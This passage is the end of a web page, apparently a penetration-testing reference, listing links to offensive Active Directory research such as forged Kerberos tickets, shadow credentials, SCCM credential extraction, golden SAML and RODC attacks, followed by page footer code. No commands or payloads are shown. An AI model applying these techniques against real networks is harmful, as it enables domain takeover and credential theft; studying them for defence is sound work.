<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials">Shadow Credentials - The Hacker Recipes</a></li>
<li><a href="https://rzander.azurewebsites.net/network-access-accounts-are-evil/">Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015</a></li>
<li><a href="https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9">The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond">Diamond tickets - The Hacker Recipes</a></li>
<li><a href="https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/">A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire">Sapphire tickets - The Hacker Recipes</a></li>
<li><a href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html">Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022</a></li>
<li><a href="https://blog.xpnsec.com/unobfuscating-network-access-accounts/">Exploring SCCM by Unobfuscating Network Access Accounts - @<em>xpn</em> - Posted on 2022-07-09</a></li>
<li><a href="https://znlive.com/xmlserializer-deserialization-vulnerability">.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive</a></li>
<li><a href="https://nodauf.dev/p/practical-guide-for-golden-saml/">Practical guide for Golden SAML - Practical guide step by step to create golden SAML</a></li>
<li><a href="https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/">Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER</a></li>
<li><a href="https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf">I AM AD FS AND SO CAN YOU - Douglas Bienstock &amp; Austin Baker - Mandiant</a></li>
<li><a href="https://aadinternals.com/post/gmsa/">Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022</a></li>
<li><a href="https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867">Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022</a></li>
<li><a href="https://cube0x0.github.io/Pocing-Beyond-DA/">Poc’ing Beyond Domain Admin - Part 1 - cube0x0</a></li>
<li><a href="https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06">At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir</a></li>
<li><a href="https://adsecurity.org/?p=3592">Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf</a></li>
<li><a href="https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/">The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo</a></li>
</ul>

  <hr>
<div class="md-source-file">
  <small>
    
      Last update:
      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">February 21, 2023</span>
      
    
  </small>
</div>





                
              </article>
            </div>
          
          
        </div>
        
          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
            Back to top
          </a>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tracking", "toc.integrate", "navigation.top"], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.b78d2936.min.js"></script>
      
    
  </body>
</html>